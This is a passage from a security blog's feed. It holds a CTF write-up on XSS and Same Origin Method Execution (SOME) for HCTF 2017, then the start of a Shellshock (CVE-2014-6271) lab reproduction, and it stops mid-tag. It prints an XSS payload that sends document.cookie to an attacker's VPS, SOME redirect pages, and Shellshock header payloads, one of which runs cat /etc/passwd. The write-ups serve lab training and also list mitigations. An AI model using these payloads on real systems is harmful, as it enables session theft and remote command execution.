    <id>http://AbelChe.com/2019/07/26/Writeup/WP-HCTF2017-Deserted-place/</id>
    <published>2019-07-26T07:53:22.000Z</published>
    <updated>2019-08-15T11:02:50.014Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h1><p><a href="https://github.com/CTFTraining/hctf_2017_deserted_place/tree/a35b31966a139146dddf7d0a11c1aed1e585e7ea" target="_blank" rel="noopener">https://github.com/CTFTraining/hctf_2017_deserted_place/tree/a35b31966a139146dddf7d0a11c1aed1e585e7ea</a></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone http<span class="variable">s:</span>//github.<span class="keyword">com</span>/CTFTraining/hctf_2017_deserted_place.git</span><br><span class="line"><span class="keyword">cd</span> hctf_2017_deserted_place</span><br><span class="line">docker-compose <span class="keyword">up</span> -d</span><br><span class="line">docker run -d -<span class="keyword">p</span> <span class="number">1000</span>:<span class="number">80</span> ctftraining/hctf_2017_somexs<span class="variable">s:latest</span></span><br></pre></td></tr></table></figure><p>访问 http://[你的ip]:1000/ 即可</p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>本题的考点在 XSS 和 SOME<br>XSS 跨站，没什么好介绍的，这道题的主要考点在 SOME</p><h2 id="SOME-Same-Origin-Method-Execution-同源方法执行"><a href="#SOME-Same-Origin-Method-Execution-同源方法执行" class="headerlink" title="SOME (Same Origin Method Execution) 同源方法执行"></a>SOME (Same Origin Method Execution) 同源方法执行</h2><p><a href="http://files.benhayak.com/Same_Origin_Method_Execution__paper.pdf" target="_blank" rel="noopener">SOME 报告原文</a></p><p>提到 SOME 要先知道 jsonp ，简单来说，Jsonp(JSON with Padding) 是 json 的一种”使用模式”，可以让网页从别的域名(网站)那获取资料，即跨域读取数据。</p><p>网站交互时有时会需要用户要提供一个参数用作要被执行函数的函数名，然后网站在执行对应的 Javascript 函数。JSONP(JSON with Padding)就是允许用户传递一个回调参数给服务端，然后服务端返回数据时会将这个回调参数作为函数名来包裹住 JSON 数据。一个简单的 PHP 示例如下:</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">https:</span><span class="comment">//example.com/main  </span></span><br><span class="line">&lt;?php  </span><br><span class="line">echo ‘&lt;script src="https:<span class="comment">//example.com/jsonp?callback=’ . $_GET[“userParam”] .‘ “&gt;’;  </span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>在上面的代码段中，用户的输入被直接注入到了 script 标签中，JSONP(<a href="https://example.com/jsonp)会返回类似如下的内容" target="_blank" rel="noopener">https://example.com/jsonp)会返回类似如下的内容</a>:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">userParam</span><span class="params">(&#123; jsonp : data &#125;)</span></span> <span class="comment">// userParam 就是用户之前通过 GET 方法提交的内容</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>深入利用</strong><br>如果攻击者发现一个网站应用存在 SOME 漏洞，那他们绝不会仅仅满足于浏览网页上的各个元素，相反，通过使用 Javascript 内建的 window.opener 方法可以打开同源网站的其他页面。利用这种方法可以大大的扩展攻击面，但缺点也很明显就是需要打开多个页面。</p></blockquote><blockquote><p><strong>使用 window.opener</strong><br>由于我们需要打开多个页面来进行攻击，所以用户必须先登录到攻击者控制的页面上，具体攻击流程如下:</p><ol><li>用户登录到攻击者的控制的页面(后续称为Window 1)；</li><li>从 Window 1中启动一个新窗口(后续称为Window 2)；</li><li>Window 2 是由 Window 1 通过 window.opener 打开的与攻击者控制页面同源的页面；</li><li>Window 1 重定向到包含按钮或者其他攻击者想执行 Javascript 方法的目标页面；</li><li>Window 2 使用 window.opener 方法打开与 Window 1 目标页面同源的存在SOME漏洞的页面；</li><li>Window 2 以 window.opener.functionToExecute 作为回调进行执行；</li><li>此时，函数会在 Window 1 中被执行。</li></ol></blockquote><p>流程如下:<br><img src="https://9kclgg.sn.files.1drv.com/y4maD7vmmOs_IrWUUDY9-BsYKsfqaW1CLJIiRjksQrFzS69FFOoROlfyBRyzuWat14PUfmXMxm8sdrfjjZCJaGaQ7-lcIs3Vg1SkkwNe23IMdt6wZM3QQwK4SiND0qD8MvIe7aSXyRu9D-u63OGgrSkeuQ--d-8Z4Pk708zEQAILz1iWJJrOgzDvOAv4nQdYapnigyxqPv6W40ofo7CQ8PfEQ?width=1022&height=768&cropmode=none" alt><br><img src="https://86ctgg.sn.files.1drv.com/y4mKTZ1guQt2FgYk3atYt66eWQzirpV6aYEU9yvT9ls9xuVLyV7srwB5cxVibZtsRvQnV89Tta_tRRj3ziUlpY7B5Qhh65-BMGPEhfkKr02i3Rj0jPHd5iOEqDo52OymJ-Kv7aeGTNBEfQSlI3-Vmo_SGGxRw5nP4W5bYCifcI-yYrkUxDfJ31jjsCo1i10mKVm85PCzUN7OjKRebsv_lS9IA?width=1015&height=761&cropmode=none" alt><br><img src="https://86csgg.sn.files.1drv.com/y4moniD0QNouO_OPgEEYSdu60iAKWyQN6uXTt6oflK7US-QvbbsVJGMwhgb9i0YMCKES2PeK86_Pbjb0txy43ntVSJ41kUGJs67NWZl2Y0dwtQe2nHqAl87ELSBQvsrqGdsWw-8RKG48xyswvvHPjAyLyTSjl6tJeXYnODhGwZY3sp06iOc6JwrHCeEYG_ShuxpUN9G1a_cPpOCWWbIsiPjEg?width=1014&height=761&cropmode=none" alt><br><img src="https://86crgg.sn.files.1drv.com/y4mu9VCiYOLNfJ_I3sSvYcvcLEwj16MXvQGwbeGCGxwKt_PngbdBbJdgKQklaDWnI8Vi7A5NaE80t_lLilDqek6vD2-r0ecWN5L1IaBeTUK1KQl_YsYW25Uez1pFOsaAaZuhcVLh87APhyoINPqR_gIPdGo24f_WwPZkl4XKTOlRo2aQM8CmlLlGbHrx8EuhYl5gwSwh20Miecsfba8otPQlQ?width=1019&height=765&cropmode=none" alt><br><img src="https://86cqgg.sn.files.1drv.com/y4mSQuAT4--ghX-mZZRiWbvV2r8rKEZ8ZIVU3lsYNBzJCuN_8IsnMSiXsdg_Rjnb8sVMOkGH8doYuIt6TlVCo0sBdTZEsSJaKLP0XqPom4q-MEe9pWGYgPKXBZF5G1LvDoIs2oOFGCQq3vg_WhqTcD8pfUsSi6fWfC5XdZ9AoCtSLN_R7AGIZu6bZfa6oFWJt5xJAp_XXZcX_SQJ-n1-8u81w?width=1021&height=765&cropmode=none" alt></p><blockquote><p><strong>攻击步骤</strong><br>上一节提到的攻击可以被页面上额外的确认弹窗提示阻止，尽管如此，攻击者依旧可以通过以下流程产生额外的窗口来绕过检查:</p><ol><li>用户登录到攻击者的控制的页面(后续称为Window 1)；</li><li>从 Window 1中启动一个新窗口(后续称为Window 2)；</li><li>从 Window 1中启动一个新窗口(后续称为Window 3)；</li><li>Window 2 和 Window 3 是由 Window 1 通过 window.opener 打开的与攻击者控制页面同源的页面；</li><li>Window 1 重定向到包含按钮或者其他攻击者想执行 Javascript 方法的页面；</li><li>Window 2 和 Window 3 使用 window.opener 方法打开与 Window 1 目标页面同源的存在SOME漏洞的页面；</li><li>Window 2 以 window.opener.buttonToClick.click 作为回调进行执行，此时 Window 1 页面上的按钮会被点击且同时弹出额外的确认弹窗；</li><li>Window 3 以 window.opener.buttonToConfirm.click 作为回调进行执行，以此来点击 Window 1 页面上确认弹窗的确认按钮；</li><li>Window 1 上的两个确认按钮均被点击，攻击完成。</li></ol></blockquote><h2 id="扫描工具-SOMEtime-BP插件"><a href="#扫描工具-SOMEtime-BP插件" class="headerlink" title="扫描工具 SOMEtime BP插件"></a>扫描工具 SOMEtime BP插件</h2><p>SOMEtime 是一个 BurpSuite 开源的被动式扫描插件，通过监听 HTTP 请求与响应来判断目标是否存在 SOME 漏洞<br><a href="https://github.com/linkedin/sometime" target="_blank" rel="noopener"></a></p><h2 id="如何缓解"><a href="#如何缓解" class="headerlink" title="如何缓解"></a>如何缓解</h2><ul><li>网站应用应尽量使用静态定义的回调值；</li><li>如果你需要同时支持多个回调端点，最好的办法就是在服务端使用白名单控制回调值，只有指定的回调值才会被执行。</li><li>通常来说，JSONP 是一种可以用来绕过同源策略有争议的技术，如果不是必须要使用，建议使用 <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage" target="_blank" rel="noopener">window.postMessage </a>这个更安全的方法来代替完成跨域请求执行。</li></ul><h1 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h1><p>题目环境功能有这么几个:登录，注册，修改信息，随机获取别人的信息并写入到自己的信息中，提交报告</p><p>测试发现修改信息 message 处存在 XSS 漏洞</p><p><img src="https://86cpgg.sn.files.1drv.com/y4m8R6gc7QJ88OLzac1su_9SA9Ult1GxCu9hhFPtW7nMnCpVZ8MI43pXc5o9y8v0rPqDpPuUcspOVUV10h7qzSMigGsYVx2zMBzkcukvQHrd_SFEGEy53K9WF6YwamE51OIcbSlQDEsaaU4Qf3QJBqFnbonKtkp-KFhut9CnstYvs_37I4n3q43W7Xgk4tPTFRBiLeSp9It_GiFwu_Z8gAQkg?width=560&height=593&cropmode=none" alt></p><p><img src="https://86cogg.sn.files.1drv.com/y4m-4TaMJaXXusYRf5uxRpfXTReiFf5RqxvvR-wiRnRkrCMf_i2PjxrBt0II22PqXszxPLbOwCPhIybbUNGmH6Jxvp3Wj4KU04I9TtQmIZfMMBLjzrDmITmRVJVJ8yd1bTJ1q-r2iWXF98zhIH8Xxqt9PtekH21oSnB9JZRAbL5bI6mbd4yzo47XvihZGCW4BDeklWxZ3B_zoq8EQYQU44UzQ?width=530&height=257&cropmode=none" alt></p><p>然后来看report.php页面</p><p>用户可以输入一个 bug link ，然后输入一个需要爆破 md5 的验证码后提交</p><blockquote><p> 简单思路如下:</p><ol><li>在 message 处构造 XSS payload ，payload 触发后跳转到公网 vps 的页面上并携带我们需要的COOKIE</li><li>将公网 vps 页面的 url 地址提交</li><li>等待管理员触发 XSS</li><li>触发后访问我们的 vps 页面，得到 COOKIE</li></ol></blockquote><p>需要的 payload 如下:</p><blockquote><p> vps上写两个页面:</p><ol><li>1.html<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">&gt;    <span class="function"><span class="keyword">function</span> <span class="title">start_some</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">&gt;        <span class="built_in">window</span>.open(<span class="string">"2.html"</span>);</span></span><br><span class="line"><span class="actionscript">&gt;        location.replace(<span class="string">"http://[题目地址]/user.php"</span>);</span></span><br><span class="line"><span class="undefined">&gt;    &#125;</span></span><br><span class="line"><span class="undefined">&gt;    setTimeout(start_some(), 1000);</span></span><br><span class="line"><span class="undefined">&gt;  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></li></ol></blockquote><blockquote><ol start="2"><li><p>2.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;   <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">&gt;       <span class="function"><span class="keyword">function</span> <span class="title">attack</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">&gt;           location.replace(<span class="string">"http://[题目地址]/edit.php?callback=RandomProfile&amp;user=[你的用户名]"</span>);</span></span><br><span class="line"><span class="undefined">&gt;       &#125;</span></span><br><span class="line"><span class="undefined">&gt;       setTimeout(attack, 2000);</span></span><br><span class="line"><span class="undefined">&gt;   </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></li></ol></blockquote><blockquote><p> XSS payload:(因为message提交会将+转译成空格，这里需要将+url编码成%2b)</p><ul><li><code>&lt;img src=&quot;\&quot; onerror=window.location.href=&#39;http://[1.html的地址]?cookie=&#39;%2bdocument.cookie&gt;</code></li></ul></blockquote><p>写个简单的爆破脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># File    :   demo.py</span></span><br><span class="line"><span class="comment"># Time    :   2019/07/26 18:18:16</span></span><br><span class="line"><span class="comment"># Author  :   AbelChe</span></span><br><span class="line"><span class="comment"># Blog    :   https://www.abelche.com</span></span><br><span class="line"><span class="comment"># Email   :   abelche@qq.com, ac.yucheng@gmail.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">blasting</span><span class="params">(s)</span>:</span></span><br><span class="line">    HSDICT = <span class="string">'qwertyuiopasdfghjklzxcvbnm1234567890'</span></span><br><span class="line">    <span class="keyword">for</span> var1 <span class="keyword">in</span> HSDICT:</span><br><span class="line">        <span class="keyword">for</span> var2 <span class="keyword">in</span> HSDICT:</span><br><span class="line">            <span class="keyword">for</span> var3 <span class="keyword">in</span> HSDICT:</span><br><span class="line">                <span class="keyword">for</span> var4 <span class="keyword">in</span> HSDICT:</span><br><span class="line">                    <span class="keyword">for</span> var5 <span class="keyword">in</span> HSDICT:</span><br><span class="line">                        <span class="keyword">for</span> var6 <span class="keyword">in</span> HSDICT:</span><br><span class="line">                            s = hashlib.md5()</span><br><span class="line">                            payload = var1 + var2 + var3 + var4 + var5 + var6</span><br><span class="line">                            s.update(payload.encode())</span><br><span class="line">                            res = s.hexdigest()[<span class="number">0</span>:<span class="number">6</span>]</span><br><span class="line">                            <span class="keyword">if</span> res == s:</span><br><span class="line">                                exit(payload + <span class="string">'\t'</span> + res)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    blasting(input(<span class="string">'substr(md5($code),0,6) == '</span>))</span><br></pre></td></tr></table></figure><p>好了，等管理员触发 XSS</p><p>然后访问 1.html 查看 cookie 即可</p><p><img src="https://86cngg.sn.files.1drv.com/y4mUXnlZ5Q4EyJyBJAuLiYZfs4Vh9rmK_EaHQPjE1UzXtWoqdlBI4Ssuydza1EmCn2f-xUjwm-JwGjCJnHhh7a3ChnncE2Qp6zZ3nY2cbyTRCkxxJNu68hJbo5eJD21jlFuAbuyF5gdK6h_evAZOBCBEML56OEROEhv_-1vOc7W5-ibASDet_kjw60fzgX0-Ts2g9RdxmPBoUSOGbaZfoUPoA?width=497&height=206&cropmode=none" alt></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>查看 /var/www/html/edit.php </p><p>回调 callback 代码如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$callback = $_GET[<span class="string">'callback'</span>];</span><br><span class="line">preg_match(<span class="string">"/\w+/i"</span>, $callback, $matches);</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;script&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> $matches[<span class="number">0</span>] . <span class="string">"();"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/script&gt;"</span>;</span><br></pre></td></tr></table></figure><p>提交数据的相关代码如下:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">UpdateProfile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> username = <span class="built_in">document</span>.getElementById(<span class="string">'user'</span>).value;</span><br><span class="line"><span class="keyword">var</span> email = <span class="built_in">document</span>.getElementById(<span class="string">'email'</span>).value;</span><br><span class="line"><span class="keyword">var</span> message = <span class="built_in">document</span>.getElementById(<span class="string">'mess'</span>).value;</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.opener.document.getElementById(<span class="string">"email"</span>).innerHTML=<span class="string">"Email: "</span>+email;</span><br><span class="line"><span class="built_in">window</span>.opener.document.getElementById(<span class="string">"mess"</span>).innerHTML=<span class="string">"Message: "</span>+message;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Update user profile success..."</span>);</span><br><span class="line"><span class="built_in">window</span>.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">EditProfile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">document</span>.onkeydown=<span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (event.keyCode == <span class="number">13</span>)&#123;</span><br><span class="line">UpdateProfile();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">RandomProfile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">setTimeout(<span class="string">'UpdateProfile()'</span>, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>当我们点击 change something 图标，触发函数edit():</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">edit</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> newWin = <span class="built_in">window</span>.open(<span class="string">"./edit.php?callback=EditProfile"</span>,<span class="string">''</span>,<span class="string">'width=600,height=600'</span>);</span><br><span class="line"><span class="keyword">var</span> loop = setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">  <span class="keyword">if</span>(newWin.closed) &#123;  </span><br><span class="line">    clearInterval(loop);  </span><br><span class="line">    update();</span><br><span class="line">  &#125;  </span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure><p>点击 click me 图标，则触发函数random():</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> newWin = <span class="built_in">window</span>.open(<span class="string">"./edit.php?callback=RandomProfile"</span>,<span class="string">''</span>,<span class="string">'width=600,height=600'</span>);</span><br><span class="line"><span class="keyword">var</span> loop = setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">  <span class="keyword">if</span>(newWin.closed) &#123;  </span><br><span class="line">    clearInterval(loop);  </span><br><span class="line">    update();</span><br><span class="line">  &#125;  </span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure><p>明显random()打开的url中带有的 callback 参数值为 RandomProfile ，触发了edit.php 页面中的 RandomProfile() 函数</p><hr><p>参考文章:<br><a href="https://xiaix.me/fan-yi-wa-jue-tong-yuan-fang-fa-zhi-xing-lou-dong-same-origin-method-execution/" target="_blank" rel="noopener">https://xiaix.me/fan-yi-wa-jue-tong-yuan-fang-fa-zhi-xing-lou-dong-same-origin-method-execution/</a><br><a href="https://blog.csdn.net/yanghuan313/article/details/53829453" target="_blank" rel="noopener">https://blog.csdn.net/yanghuan313/article/details/53829453</a><br><a href="https://michaelwayneliu.github.io/2017/12/21/SOME攻击/" target="_blank" rel="noopener">https://michaelwayneliu.github.io/2017/12/21/SOME%E6%94%BB%E5%87%BB/</a><br><a href="http://files.benhayak.com/Same_Origin_Method_Execution__paper.pdf" target="_blank" rel="noopener">http://files.benhayak.com/Same_Origin_Method_Execution__paper.pdf</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;题目复现&quot;&gt;&lt;a href=&quot;#题目复现&quot; class=&quot;headerlink&quot; title=&quot;题目复现&quot;&gt;&lt;/a&gt;题目复现&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/CTFTraining/hctf_2017_deserted_pla
      
    
    </summary>
    
      <category term="WriteUp" scheme="http://AbelChe.com/categories/WriteUp/"/>
    
    
      <category term="XSS" scheme="http://AbelChe.com/tags/XSS/"/>
    
      <category term="SOME" scheme="http://AbelChe.com/tags/SOME/"/>
    
  </entry>
  
  <entry>
    <title>Bash 远程代码执行漏洞(CVE-2014-6271)复现</title>
    <link href="http://AbelChe.com/2019/07/25/CVE/Bash%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2014-6271%EF%BC%89%E5%A4%8D%E7%8E%B0/"/>
    <id>http://AbelChe.com/2019/07/25/CVE/Bash 远程代码执行漏洞（CVE-2014-6271）复现/</id>
    <published>2019-07-25T10:50:48.000Z</published>
    <updated>2019-08-15T11:02:50.013Z</updated>
    
    <content type="html"><![CDATA[<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><h2 id="CGI"><a href="#CGI" class="headerlink" title="CGI"></a>CGI</h2><p>CGI全称是“公共网关接口”(Common Gateway Interface)，HTTP服务器与你的或其它机器上的程序进行“交谈”的一种工具，其程序须运行在网络服务器上。<br>CGI可以用任何一种语言编写，只要这种语言具有标准输入、输出和环境变量。<br>CGI环境变量列表:<br>    SERVER-NAME:运行CGI序为机器名或IP地址。<br>　　SERVER-INTERFACE:WWW服务器的类型，如:CERN型或NCSA型。<br>　　SERVER-PROTOCOL:通信协议，应当是HTTP/1.0。<br>　　SERVER-PORT:TCP端口，一般说来web端口是80。<br>　　HTTP-ACCEPT:HTTP定义的浏览器能够接受的数据类型。</p><a id="more"></a><p>　　HTTP-REFERER: 发送表单的文件URL。(并非所有的浏览器都传送这一变量)<br>　　HTTP-USER-AGENT:发送表单的浏览器的有关信息。<br>　　GETWAY-INTERFACE:CGI程序的版本，在UNIX下为 CGI/1.1。<br>　　PATH-TRANSLATED: PATH-INFO中包含的实际路径名。<br>　　PATH-INFO:浏览器用GET方式发送数据时的附加路径。<br>　　SCRIPT-NAME: CGI程序的路径名。<br>　　QUERY-STRING:表单输入的数据，URL中间号后的内容。<br>　　REMOTE-HOST:发送程序的主机名，不能确定该值。<br>　　REMOTE-ADDR:发送程序的机器的IP地址。<br>　　REMOTE-USER:发送程序的人名。<br>　　CONTENT-TYPE:POST发送，一般为applioation/xwww-form-urlencoded。<br>　　CONTENT-LENGTH:POST方法输入的数据的字节数</p><p>Web服务器可以解析(handles)HTTP协议。当Web服务器接收到一个HTTP请求(request)，会返回一个HTTP响应 (response)，例如送回一个HTML页面。为了处理一个请求(request)，Web服务器可以响应(response)一个静态页面或图片，进行页面跳转(redirect)，或者把动态响应(dynamic response)的产生委托(delegate)给一些其它的程序例如CGI脚本，JSP(JavaServer Pages)脚本，servlets，ASP(Active Server Pages)脚本，服务器端(server-side)JavaScript，或者一些其它的服务器端(server-side)技术。无论它们的目的如何，这些服务器端(server-side)的程序通常产生一个HTML的响应(response)来让浏览器可以浏览。</p><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p><img src="https://jerexw.sn.files.1drv.com/y4mzU0Q1uY8Rw5dxsaQvxAZFh93rbb-sjCJWdOcleAzpOc56fuhajS91OkpXYLY1ScCiITrOX-ujNbpU7uCWcrBoAf8Y5wnOamwB06abF_JOcpI2iV742B_fMazLJxL7AJ7mZ0_Afw2AroF8G2fVV--WJDFibmQd-9OM0mDuuLLZZSRvCk-6QUkNWi0LhL4URZMYwEtwta3CrT3xvmQuZqaxA?width=584&height=1074&cropmode=none" alt></p><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><blockquote><p>GNU Bash 4.3及之前版本在评估某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行shell命令。某些服务和应用允许未经身份验证的远程攻击者提供环境变量以利用此漏洞。</p><p>此漏洞源于在调用bash shell之前可以用构造的值创建环境变量。这些变量可以包含代码，在shell被调用后会被立即执行。</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a href="https://github.com/Medicean/VulApps/tree/master/b/bash/shellshock1_CVE-2014-6271" target="_blank" rel="noopener">https://github.com/Medicean/VulApps/tree/master/b/bash/shellshock1_CVE-2014-6271</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> docker pull medicean/vulapps:b_bash_shellshock1</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> docker run -d -p 1000:80 medicean/vulapps:b_bash_shellshock1</span></span><br></pre></td></tr></table></figure><p>然后访问 http://[你的ip]:1000 即可</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ol><li>点击页面上的 poc.cgi 后跳转到如图页面</li></ol><p><img src="https://jurdxw.sn.files.1drv.com/y4makO-Jc3JUis8HCaVgtNwgRHI965u-GHdNBMePLfX6FZGiAu3yIwHldNE2xyP5J907Fyx2iMADJ6rUx41NO6JCiOgQqq8jQQv6VRlzfewlYWifaAVA5dVA5l2ENOZbH0VbNP5H5gwPFpKMN8DlnOq77AgPgVRPudv1rB4gIzO1IG_ij_9s78V-EFI9jbKj4IrizCFpjpelY3gdMG24gnGjA?width=876&height=459&cropmode=none" alt></p><p>明显返回的是 cgi 环境变量</p><ol start="2"><li>bp抓包</li></ol><p><img src="https://jerjxw.sn.files.1drv.com/y4mGY8bSlrLVhZiCIKUIjFkFN4zkmk1dKkawA-zDRBPZMiY5nomqrnOGTb7H-Xc8E8QJR1E_gzUTXBzChCqDdnHr8IEkmSA8en7siN3kH6LRBQ1Mxw45-9S8ieh93e3gsPhmXme0bfz6mgEGAWqBqhdd9VfT8qbbpwMdmt5twobcVow9jQcH2immk9tJUE58uB0YF12td37jVdoCwt_EoLmBg?width=1262&height=785&cropmode=none" alt></p><ol start="3"><li>将http头中除GET之外的某一处数据改为<code>() { :;}; echo ;echo ;echo 123;</code></li></ol><p>例如:<code>User-Agent: () { :;}; echo ;echo ;echo 123;</code>然后发包</p><p><img src="https://jerixw.sn.files.1drv.com/y4myS7owqdmOdMpV_BjLd0MDwBRvKDzXq2lHkKsPpKZKJYm1NBm-QQ1txU1-KNkotLG5Ki7R4BELOp1G0sVO8rBeNj-UFNtP1rnARguG_R-kqO8S_QSiiTg-IMCciykqztlf8VaeKGhHNrBov5Vpss4WnsNcCqw0t-FUSNjCp_w-p3wjPN5CvWcaCh8IrNrcM6uEP_ZS5MbPVw8Zw37RmbIiQ?width=1915&height=932&cropmode=none" alt></p><p>发现命令执行成功了</p><ol start="4"><li>然后测试执行系统命令<code>() { :;}; echo ;echo ;echo $(/bin/cat /etc/passwd);</code></li></ol><p><img 